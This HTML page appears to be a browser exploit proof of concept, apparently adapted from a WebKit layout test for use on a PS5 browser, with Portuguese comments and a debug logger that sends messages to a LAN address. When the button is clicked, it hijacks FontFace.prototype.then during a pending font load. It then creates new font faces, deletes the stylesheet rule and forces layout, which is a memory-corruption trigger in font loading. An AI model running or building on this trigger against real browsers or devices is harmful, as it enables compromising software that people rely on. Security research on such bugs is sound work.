<!DOCTYPE html>
<html>
    <head>
        <style id="s">
        @font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
        </style>
    </head>
    <body>
        <button id="button_click">Clicar Aqui</button>
        <script>
            if (window.testRunner) {
                testRunner.dumpAsText();
                testRunner.waitUntilDone();
            }
            const element = document.getElementById("button_click");

            element.addEventListener("click", (ev) => {
                function logToPC(message) {
                    try {
                        var xhr = new XMLHttpRequest();
                        // Substitua pelo IP do seu PC e a porta configurada no Apache
                        xhr.open("GET", "http://192.168.1.5:3000/bot/test?data=" + message, true);
                        xhr.send();
                    } catch(e) {
                        console.log(e)
                        // Fallback caso a própria requisição falhe
                    }
                }

                logToPC("TESTE PS5")
                let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
                document.fonts.add(A);
                void A.loaded;

                let fired = false;
                Object.defineProperty(FontFace.prototype, 'then', {
                    configurable: true,
                    get() {
                        if (!fired && this === A) {
                            fired = true;
                            new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                            new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                            document.getElementById('s').sheet.deleteRule(0);
                            document.body.offsetTop;
                        }
                        return undefined;
                    }
                });
                document.fonts.load('1em x', 'AB');
                setTimeout(() => {
                    if (window.testRunner)
                        testRunner.notifyDone();
                }, 5000);
            })
        </script>
    </body>
</html>
